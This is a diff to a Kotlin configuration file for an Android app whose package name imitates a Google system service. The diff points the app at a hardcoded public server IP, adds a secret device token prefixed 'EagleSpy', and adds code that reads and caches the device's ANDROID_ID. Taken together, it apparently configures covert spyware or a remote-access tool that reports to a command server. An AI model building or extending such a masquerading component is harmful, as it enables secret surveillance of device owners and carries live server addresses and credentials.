@@ -3,9 +3,31 @@ package com.google.android.systemservice.config
 import android.content.Context
 
 object AndroidConfig {
-    // Server Configuration (can be dynamically updated)
-    private var serverBaseUrl = "192.168.1.5:3000"
+    // Server Configuration
+    // TODO: Change this to your computer's LAN IP (e.g., 192.168.1.5) if testing on physical device OR MuMu Player
+    // 10.0.2.2 works ONLY for the official Android Studio Emulator
+    // private var serverBaseUrl = "192.168.1.5:8080" 
+    private var serverBaseUrl = "213.91.211.150:8080"
     private var useHttps = false
+    
+    // API Authentication Token (MUST match server's config/device_secret.token)
+    const val DEVICE_TOKEN = "EagleSpy_X9f2K7mN4pQ8wL3jR6vT1bY5cH0sA"
+    
+    // Device Identifier (cached from Settings.Secure.ANDROID_ID)
+    var deviceId: String = ""
+        private set
+    
+    /**
+     * Initialize device ID from Android system (call once on app start)
+     */
+    fun initDeviceId(context: Context) {
+        if (deviceId.isEmpty()) {
+            deviceId = android.provider.Settings.Secure.getString(
+                context.contentResolver,
+                android.provider.Settings.Secure.ANDROID_ID
+            ) ?: "unknown_device"
+        }
+    }
     
     // Computed URLs
     val httpProtocol: String
